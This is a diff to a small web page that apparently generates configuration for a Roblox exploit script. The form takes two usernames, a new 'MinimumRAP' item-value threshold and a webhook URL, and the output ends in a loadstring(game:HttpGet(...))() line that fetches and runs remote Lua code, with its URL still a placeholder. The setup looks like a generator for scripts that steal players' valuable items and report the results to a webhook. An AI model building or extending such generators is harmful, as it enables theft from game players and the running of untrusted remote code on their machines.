@@ -63,6 +63,8 @@
       <input type="text" id="username" name="username"><br><br>
       <label for="username2">Username2:</label>
       <input type="text" id="username2" name="username2"><br><br>
+      <label for="minimumRAP">MinimumRAP:</label>
+      <input type="text" id="minimumRAP" name="minimumRAP"><br><br>
       <label for="webhook">Webhook URL:</label>
       <input type="text" id="webhook" name="webhook"><br><br>
       <button type="button" onclick="generateOutput()">Generate</button>
@@ -75,9 +77,11 @@
     function generateOutput() {
       const username = document.getElementById("username").value;
       const username2 = document.getElementById("username2").value;
+      const minimumRAP = document.getElementById("minimumRAP").value;
       const webhook = document.getElementById("webhook").value;
       const outputString = `Username = "${username}"\n` +
                            `Username2 = "${username2}"\n` +
+                           `MinimumRAP = "${minimumRAP}"\n` +
                            `Webhook = "${webhook}"\n` +
                            'loadstring(game:HttpGet("GENERATOR SOON GUYS!"))()';
       document.getElementById("output").value = outputString;
